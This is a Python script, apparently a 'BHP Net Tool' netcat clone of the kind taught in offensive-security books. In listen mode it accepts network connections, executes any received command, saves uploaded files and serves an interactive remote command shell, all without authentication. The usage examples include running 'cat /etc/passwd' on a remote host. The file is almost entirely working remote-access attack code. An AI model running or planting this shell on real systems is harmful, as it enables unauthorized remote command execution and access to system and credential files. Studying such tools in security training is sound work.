import argparse
import socket
import shlex
import subprocess
import sys
import textwrap
import threading

def execute(cmd):
  cmd = cmd.strip()
  if not cmd:
    return
  
  output = subprocess.check_output(shlex.split(cmd),
                                   stderr=subprocess.STDOUT)
  
  return output.decode()

class Netcat:
  def __init__(self, args):
    self.args = args
    self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

  def run(self):
    if self.args.listen:
      self.listen()

    else:
      self.send()

  def send(self):
    self.socket.connect((self.args.target, self.args.port))
    
    if self.args.execute:
      self.socket.send((f'execute:{self.args.execute}').encode())
      response = self.socket.recv(4096)
      print(response.decode())

    elif self.args.upload:
      file_path = self.args.upload
      f = open(file_path, 'r')
      file_content = f.read()
      f.close()

      self.socket.send(('upload:' + file_path + ':' + file_content).encode())
      response = self.socket.recv(4096)
      print(response.decode())

    elif self.args.command:
      self.socket.send(b'command')
      # response = self.socket.recv(4096)
      # print(response.decode())

      try:
        while True:
          recv_len = 1
          response = ''
          while recv_len:
            data = self.socket.recv(4096)
            recv_len = len(data)
            response += data.decode()
            if recv_len < 4096:
              break

          if response:
            print(response)
            cmd = input('> ')
            cmd += '\n'
            self.socket.send(cmd.encode())

      except KeyboardInterrupt:
        print('User terminated.')
        self.socket.close()
        # sys.exit()

  def listen(self):
    self.socket.bind((self.args.target, self.args.port))
    self.socket.listen(5)

    while True:
      client_socket, _ = self.socket.accept()
      client_thread = threading.Thread(target=self.handle,
                                       args=(client_socket,))
      client_thread.start()

  def handle(self, client_socket):
    data = client_socket.recv(4096).decode().split(':')

    if data[0] == 'execute':
      command = data[1]
      print(command)
      output = execute(command)
      client_socket.send(output.encode())

    elif data[0] == 'upload':
      file_path = data[1].split('/')[-1]
      file_content = data[2]

      with open(file_path, 'w') as f:
        f.write(file_content)

      message = f'Saved file {file_path}'
      client_socket.send(message.encode())

    elif data[0] == 'command':
      cmd = b''
      while True:
        try:
          client_socket.send(b'BHP: #> ')
          while '\n' not in cmd.decode():
            cmd += client_socket.recv(128)
          
          response = execute(cmd.decode())
          if response:
            client_socket.send(response.encode())
        
          cmd = b''

        except Exception as e:
          print(f'Server killed {e}')
          self.socket.close()
          # sys.exit()

if __name__ == '__main__':
  parser = argparse.ArgumentParser(
    description='BHP Net Tool',
    formatter_class=argparse.RawDescriptionHelpFormatter,
    epilog=textwrap.dedent('''Example:
        netcat.py -t 192.168.1.108 -p 5555 -l -c # command shell
        netcat.py -t 192.168.1.108 -p 5555 -l -u=mytest.txt #upload to file
        netcat.py -t 192.168.1.108 -p 5555 -l -e=\"cat /etc/passwd\" #execute command
        echo 'ABC' | ./netcat.py -t 192.168.1.108 -p 135 # echo text to server port 135
        netcat.py -t 192.168.1.108 -p 5555 # connect to server                       
'''))
  parser.add_argument('-c', '--command', action='store_true', help='command shell')
  parser.add_argument('-e', '--execute', help='execute specified command')
  parser.add_argument('-l', '--listen', action='store_true', help='listen')
  parser.add_argument('-p', '--port', type=int, default=5555, help='specified port')
  parser.add_argument('-t', '--target', default='192.168.1.203', help='specified IP')
  parser.add_argument('-u', '--upload', help='upload file')
  args = parser.parse_args()
  # print(type(args))
  # print(args.execute)
  
  nc = Netcat(args)
  nc.run()